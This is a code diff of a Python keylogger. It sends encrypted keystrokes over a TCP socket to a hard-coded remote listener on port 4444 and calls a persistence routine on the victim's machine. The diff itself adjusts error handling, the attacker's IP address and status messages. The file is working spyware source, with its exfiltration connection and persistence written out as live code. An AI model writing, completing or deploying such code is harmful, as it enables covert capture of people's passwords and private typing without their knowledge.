@@ -27,20 +27,24 @@ class Keylogger():
 		try:
 				
 			self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 			Address = (self.__Host, self.__Port)
+
 			self.client.connect(Address)
+
 			print(f"Connected to {self.__Host}:{self.__Port}")
+			
 			self.client_connect = True
 		
-		except Exception as e:
+		except ConnectionRefusedError:
 
-			print(f"Could not connect to Server, due to {e}")
+			print("Could not connect to the Server")
+			print("Make sure the Server is listening for connection...")
 
 	def persistance(self):
 
 		manipulate.path_manipulation()
 	
-		
 	def write_to_file(self, key):
 
 		keystroke = str(key)
@@ -55,22 +59,21 @@ class Keylogger():
 		if keystroke:
 
 			# byte_msg = keystroke.encode('utf-8')
-			byte_msg = crypt.encrypt(keystroke.encode())
+			byte_msg = crypt.encrypt(keystroke.encode('utf-8'))
+
 			if self.client_connect:
 
 				self.client.sendall(byte_msg)
 
-
 if __name__ == '__main__':
 	
-	Host = "192.168.1.22"
+	Host = "192.168.0.199"
 	Port = 4444
 	victim = Keylogger(Host, Port)
 
    # load the key
 	KEY = b"GLpnLBTkUsqcwT5TYpMgQT0c-W_Ust13ybM3ZK5whj8="
 	crypt = Fernet(KEY)
-
 
 	victim.persistance()
 	victim.connect_server()
@@ -84,7 +87,7 @@ if __name__ == '__main__':
 	except KeyboardInterrupt:
 			
 				l.stop()
-				print("We are done here")
+				print("Program has been terminated")
 	
 
 
